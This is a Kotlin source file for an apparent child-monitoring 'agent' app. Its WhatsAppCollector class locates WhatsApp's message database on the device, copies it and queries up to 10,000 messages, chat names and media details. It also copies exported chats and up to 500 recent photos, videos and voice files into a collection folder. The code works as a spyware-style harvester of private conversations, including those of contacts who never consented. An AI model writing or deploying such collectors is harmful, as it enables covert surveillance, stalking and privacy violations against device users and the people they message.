package com.safechild.agent.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.sqlite.SQLiteDatabase
import android.os.Build
import android.os.Environment
import android.util.Log
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class WhatsAppCollector(private val context: Context) {
    
    companion object {
        private const val TAG = "WhatsAppCollector"
        private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        // WhatsApp database paths
        private val WHATSAPP_DB_PATHS = listOf(
            "/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
            "/WhatsApp/Databases/msgstore.db",
            "/Android/data/com.whatsapp/databases/msgstore.db"
        )
        
        private val WHATSAPP_MEDIA_PATHS = listOf(
            "/Android/media/com.whatsapp/WhatsApp/Media",
            "/WhatsApp/Media"
        )
    }
    
    fun hasPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    fun collect(outputDir: File): Map<String, Any> {
        val result = mutableMapOf<String, Any>(
            "status" to "not_found",
            "messages" to emptyList<Map<String, Any?>>(),
            "chats" to emptyList<Map<String, Any?>>(),
            "media_files" to emptyList<String>()
        )
        
        if (!hasPermission()) {
            result["status"] = "no_permission"
            return result
        }
        
        // Try to find and copy WhatsApp database
        val dbFile = findWhatsAppDatabase()
        if (dbFile != null && dbFile.exists()) {
            try {
                // Copy database to our temp directory
                val copiedDb = File(outputDir, "whatsapp_msgstore.db")
                copyFile(dbFile, copiedDb)
                
                // Parse the database
                val messages = parseWhatsAppDatabase(copiedDb)
                result["messages"] = messages
                result["status"] = "success"
                result["message_count"] = messages.size
                
                // Get chat list
                val chats = extractChatList(copiedDb)
                result["chats"] = chats
                result["chat_count"] = chats.size
                
            } catch (e: Exception) {
                Log.e(TAG, "Error parsing WhatsApp database", e)
                result["status"] = "parse_error"
                result["error"] = e.message ?: "Unknown error"
            }
        } else {
            // Try to collect exported chat files
            val exportedChats = findExportedChats(outputDir)
            if (exportedChats.isNotEmpty()) {
                result["exported_chats"] = exportedChats
                result["status"] = "exported_only"
            }
        }
        
        // Collect WhatsApp media files
        val mediaFiles = collectWhatsAppMedia(outputDir)
        result["media_files"] = mediaFiles
        result["media_count"] = mediaFiles.size
        
        return result
    }
    
    private fun findWhatsAppDatabase(): File? {
        val externalStorage = Environment.getExternalStorageDirectory()
        
        for (path in WHATSAPP_DB_PATHS) {
            val dbFile = File(externalStorage, path)
            if (dbFile.exists() && dbFile.canRead()) {
                Log.d(TAG, "Found WhatsApp database at: ${dbFile.absolutePath}")
                return dbFile
            }
        }
        
        return null
    }
    
    private fun parseWhatsAppDatabase(dbFile: File): List<Map<String, Any?>> {
        val messages = mutableListOf<Map<String, Any?>>()
        
        try {
            val db = SQLiteDatabase.openDatabase(
                dbFile.absolutePath,
                null,
                SQLiteDatabase.OPEN_READONLY
            )
            
            // Query messages table
            val cursor = db.rawQuery("""
                SELECT 
                    m._id,
                    m.key_remote_jid,
                    m.key_from_me,
                    m.data,
                    m.timestamp,
                    m.media_wa_type,
                    m.media_mime_type,
                    m.media_size,
                    m.media_name,
                    m.media_caption,
                    m.thumb_image,
                    c.subject as chat_name
                FROM messages m
                LEFT JOIN chat c ON m.key_remote_jid = c.jid
                ORDER BY m.timestamp DESC
                LIMIT 10000
            """, null)
            
            cursor?.use {
                while (it.moveToNext()) {
                    val message = mapOf(
                        "id" to it.getLong(it.getColumnIndexOrThrow("_id")),
                        "chat_jid" to it.getString(it.getColumnIndexOrThrow("key_remote_jid")),
                        "chat_name" to it.getString(it.getColumnIndexOrThrow("chat_name")),
                        "is_from_me" to (it.getInt(it.getColumnIndexOrThrow("key_from_me")) == 1),
                        "text" to it.getString(it.getColumnIndexOrThrow("data")),
                        "timestamp" to it.getLong(it.getColumnIndexOrThrow("timestamp")),
                        "date" to dateFormat.format(Date(it.getLong(it.getColumnIndexOrThrow("timestamp")))),
                        "media_type" to getMediaType(it.getInt(it.getColumnIndexOrThrow("media_wa_type"))),
                        "media_mime" to it.getString(it.getColumnIndexOrThrow("media_mime_type")),
                        "media_size" to it.getLong(it.getColumnIndexOrThrow("media_size")),
                        "media_name" to it.getString(it.getColumnIndexOrThrow("media_name")),
                        "media_caption" to it.getString(it.getColumnIndexOrThrow("media_caption"))
                    )
                    messages.add(message)
                }
            }
            
            db.close()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error reading WhatsApp database", e)
        }
        
        return messages
    }
    
    private fun extractChatList(dbFile: File): List<Map<String, Any?>> {
        val chats = mutableListOf<Map<String, Any?>>()
        
        try {
            val db = SQLiteDatabase.openDatabase(
                dbFile.absolutePath,
                null,
                SQLiteDatabase.OPEN_READONLY
            )
            
            val cursor = db.rawQuery("""
                SELECT 
                    jid,
                    subject,
                    creation,
                    sort_timestamp
                FROM chat
                ORDER BY sort_timestamp DESC
            """, null)
            
            cursor?.use {
                while (it.moveToNext()) {
                    val jid = it.getString(it.getColumnIndexOrThrow("jid"))
                    val subject = it.getString(it.getColumnIndexOrThrow("subject"))
                    val chat = mapOf<String, Any?>(
                        "jid" to jid,
                        "name" to (subject ?: extractNameFromJid(jid)),
                        "creation_time" to it.getLong(it.getColumnIndexOrThrow("creation")),
                        "last_activity" to it.getLong(it.getColumnIndexOrThrow("sort_timestamp")),
                        "is_group" to jid.contains("@g.us")
                    )
                    chats.add(chat)
                }
            }
            
            db.close()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error extracting chat list", e)
        }
        
        return chats
    }
    
    private fun collectWhatsAppMedia(outputDir: File): List<String> {
        val mediaFiles = mutableListOf<String>()
        val externalStorage = Environment.getExternalStorageDirectory()
        val mediaOutputDir = File(outputDir, "whatsapp_media")
        mediaOutputDir.mkdirs()
        
        for (path in WHATSAPP_MEDIA_PATHS) {
            val mediaDir = File(externalStorage, path)
            if (mediaDir.exists() && mediaDir.isDirectory) {
                // Collect recent images and videos (last 30 days)
                val thirtyDaysAgo = System.currentTimeMillis() - (30L * 24 * 60 * 60 * 1000)
                
                mediaDir.walkTopDown()
                    .filter { it.isFile && it.lastModified() > thirtyDaysAgo }
                    .filter { 
                        it.extension.lowercase() in listOf("jpg", "jpeg", "png", "gif", "mp4", "3gp", "webm", "opus", "mp3")
                    }
                    .take(500) // Limit to 500 files
                    .forEach { file ->
                        try {
                            val destFile = File(mediaOutputDir, "${System.currentTimeMillis()}_${file.name}")
                            copyFile(file, destFile)
                            mediaFiles.add(destFile.name)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error copying media file: ${file.name}", e)
                        }
                    }
                break
            }
        }
        
        return mediaFiles
    }
    
    private fun findExportedChats(outputDir: File): List<String> {
        val exportedChats = mutableListOf<String>()
        val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        
        // Look for WhatsApp exported chat files
        downloadDir?.listFiles()?.filter { 
            it.name.startsWith("WhatsApp Chat") && it.extension == "txt" 
        }?.forEach { file ->
            try {
                val destFile = File(outputDir, "exported_${file.name}")
                copyFile(file, destFile)
                exportedChats.add(destFile.name)
            } catch (e: Exception) {
                Log.e(TAG, "Error copying exported chat", e)
            }
        }
        
        return exportedChats
    }
    
    private fun copyFile(src: File, dest: File) {
        FileInputStream(src).use { input ->
            FileOutputStream(dest).use { output ->
                input.copyTo(output)
            }
        }
    }
    
    private fun getMediaType(type: Int): String {
        return when (type) {
            0 -> "text"
            1 -> "image"
            2 -> "audio"
            3 -> "video"
            4 -> "contact"
            5 -> "location"
            8 -> "document"
            9 -> "voice_note"
            13 -> "gif"
            15 -> "sticker"
            else -> "unknown"
        }
    }
    
    private fun extractNameFromJid(jid: String?): String {
        return jid?.substringBefore("@")?.replace("-", " ") ?: ""
    }
}
